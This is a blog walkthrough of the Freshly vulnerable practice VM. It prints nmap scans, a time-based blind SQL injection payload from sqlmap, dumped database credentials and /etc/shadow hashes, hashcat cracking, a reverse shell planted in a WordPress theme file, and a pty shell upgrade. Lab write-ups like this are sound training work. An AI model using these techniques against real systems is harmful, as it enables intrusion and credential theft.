---
layout: post
title: Walkthrough Freshly
date: 2016-04-25 21:47:30.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- CTR
- pen-testing
- security
- wargames
meta:
  _oembed_9221ff89e72b62de312e61f62f0e4d12: "<div class=\"embed-binarytides\"><blockquote
    class=\"wp-embedded-content\"><a href=\"http://www.binarytides.com/sqlmap-hacking-tutorial/\">Sqlmap
    tutorial for beginners &#8211; hacking with sql injection</blockquote><script
    type='text/javascript'><!--//--><![CDATA[//><!--\t\t!function(a,b){\"use strict\";function
    c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf(\"MSIE 10\"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll(\"iframe.wp-embedded-content\"),j=b.querySelectorAll(\"blockquote.wp-embedded-content\");for(c=0;c<j.length;c++)j[c].style.display=\"none\";for(c=0;c<i.length;c++)if(d=i[c],d.style.display=\"\",!d.getAttribute(\"data-secret\")){if(f=Math.random().toString(36).substr(2,10),d.src+=\"#?secret=\"+f,d.setAttribute(\"data-secret\",f),g||h)a=d.cloneNode(!0),a.removeAttribute(\"security\"),d.parentNode.replaceChild(a,d)}else;}}var
    d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var
    d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var
    e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret=\"'+d.secret+'\"]'),k=b.querySelectorAll('blockquote[data-secret=\"'+d.secret+'\"]');for(e=0;e<k.length;e++)k[e].style.display=\"none\";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.style.display=\"\",\"height\"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else
    if(200>~~g)g=200;f.height=g}if(\"link\"===d.message)if(h=b.createElement(\"a\"),i=b.createElement(\"a\"),h.href=f.getAttribute(\"src\"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener(\"message\",a.wp.receiveEmbedMessage,!1),b.addEventListener(\"DOMContentLoaded\",c,!1),a.addEventListener(\"load\",c,!1)}(window,document);//--><!]]></script><iframe
    sandbox=\"allow-scripts\" security=\"restricted\" src=\"http://www.binarytides.com/sqlmap-hacking-tutorial/embed/\"
    width=\"600\" height=\"338\" title=\"Embedded WordPress Post\" frameborder=\"0\"
    marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" class=\"wp-embedded-content\"></iframe></div>"
  _oembed_time_9221ff89e72b62de312e61f62f0e4d12: '1461619731'
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '22163068225'
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---

I did another vulnerable VM. This one is called Freshly and can be found [here.](https://www.vulnhub.com/entry/tophatsec-freshly,118/) It is also made by tophatsec, so [thanks tophatsec](http://www.top-hat-sec.com/r4v3ns-blog/new-vm-challenge-freshly) for another great VM. Let's get started.
First let's find the machine.

```bash
nmap 192.168.1.1/24
```

Great, now that we got the ip, let's scan it.

```bash
nmap -A -T4 -p- 192.168.1.107                        [12:17:27]
Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-24 12:18 CLST
Nmap scan report for 192.168.1.107
Host is up (0.00058s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05
|_Not valid after:  2025-02-14T03:30:05
8080/tcp open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds
```

Okay, so we have a port 80, and SSL-port 443, and port 8080. All web.
On port 80 there is just a star-wars gif. I download it and check it out if exiftool just in case. But nothing of interest.
I fire up ZAP and start doing a Force Browse (DirBusting).
Meanwhile I check out port 8080 and port 443. Both of them seem to lead to a wordpress-installation. I snoop around and find that there is a user named admin (the default user in wordpress). I try to login with admin/admin in /wp-admin but no result. I also try a dictionary-attack but without any luck. But I am not blocked out, so that means there are no plugins with fail2ban -features.
I try some sqlinjections in the store but without success.
So I go back to ZAP to see what it has found. And I can see that it has found a page called /login.php and phpmyadmin. So I head over to login.php and find a login. I use sqlmap to see if there are any vulnerabilities.
So I make a request and the intercept it in burp suite, and copypaste the request to a file I call request.txt. "user" is the parameter that I am testing for injections.

```bash
./sqlmap.py -r request.txt -p user
```

Okay, so sqlmap found a [](http://www.sqlinjection.net/time-based/">time-based blind.

```
---
Parameter: user (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: user=' AND (SELECT * FROM (SELECT(SLEEP(5)))RRpU) AND 'wUfW'='wUfW&password=&s=Submit
---
```

I had never successfully used sqlmap before, so this was a great learning experience. So after finding out that there is a vulnerability I run the following command to get the databases. It really took a long time because it was a time-based attack.

```
./sqlmap.py -r request.txt -p user --dbs
```

Output:

```
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
```
Then I wanted the tables and the content, so I ran:
```
./sqlmap.py -r request.txt -p user --tables -D wordpress8080
Database: wordpress8080
[1 table]
+-------+
| users |
+-------+
```

```
./sqlmap.py -r request.txt -p user --dump -D wordpress8080 -T users                                  [18:45:53]
Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
```
So yeah, not so secret password. I used it to login to wordpress.
This [](http://www.binarytides.com/sqlmap-hacking-tutorial/">guide was quite useful to get the hang of sqlmap.
So, admin on a CMS usually means shell. So I went to appearance/editor and then I just copy-pasted my reverse shell into header.php. Probably not the most silent way, but it is easy to remove the code after it has been executed.
Then I fired up netcat. With:

```
nc -v -l 1234
```

`-v` stands for verbose. `-l` for listening. And 1234 is the port. The `-p` flag is not really needed to define the port.
Make sure that your firewall is open.

```
sudo ufw allow 1234
```

So, now I got a shell with the user daemon

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

I create a file in /tmp called linEnum.sh where I copypaste the linEnum-file. Then:

```
chmod +x linEnum.sh
./linEnum.sh
```

To enumerate important and interesting files. It outputs a lot of stuff, among others this:
/etc/passwd

```
user:x:1000:1000
mysql:x:103:111
candycane:x:1001:1001
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
```

And the following in /etc/shadow

```
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
mysql:!:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
There is also a message in the shadow-file:
# YOU STOLE MY PASSWORD FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
```

I thought I had to reach root, so I didn't really think of this as the flag. So I copied the hashes and started running hashcat on them, which was fun as it was the first time. So I ran it an all the three hashes, with the following command.

```
./hashcat-cli64.bin -m 1800 -a 0 -o found.txt --remove candycane.hash ~/sectools/SecLists/Passwords/10_million_password_list_top_100000.txt
```

I only found the password for candycane which was "password". I didn't manage to crack the other users.
Now I wanted to su up for candycane but it didn't work since I didn't have a tty-shell. And
```
import pty; pty.spawn('/bin/bash')
```
this didn't work. But I found a workaround.

```
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
ptyhon shell.py
```

So this gave me a tty-shell and I could run su candycane.
So, here I got stuck a while and started looking back in my notes to see if I had missed something. So I took out the content from the database login

```
Database: login
Table: users
[2 entries]
+----------+-----------+
| password | user_name |
+----------+-----------+
| password | candyshop |
| PopRocks | Sir       |
+----------+-----------+
```

And I tried these passwords on user and root. But it didn't work. After many other tries enumerating the system I gave up. And on some other walkthroughs I found that the password for user (which was a sudo-user) and root was SuperSecretPassword. So that was a little bit annoying that I never tried that. And I also found out that it was the same password for the mysql-root user. Which could be found in the login.php-file. So that was a little bit stupid that I never checked that.

## Conclusion
All in all it was a great VM. I got to learn tools like hashcat and sqlmap, which I am sure will come in handy on other VMs. I also learned about wpscan while reading other walkthroughs. I was surprised that SuperSecretPassword was not found in my password-dictionaries that I tried.
Other things that I missed was playing around with phpmyadmin. I read in some other walkthroughs that you could figure out the DBMS from it. That would have been good.
But at least I got the flags.
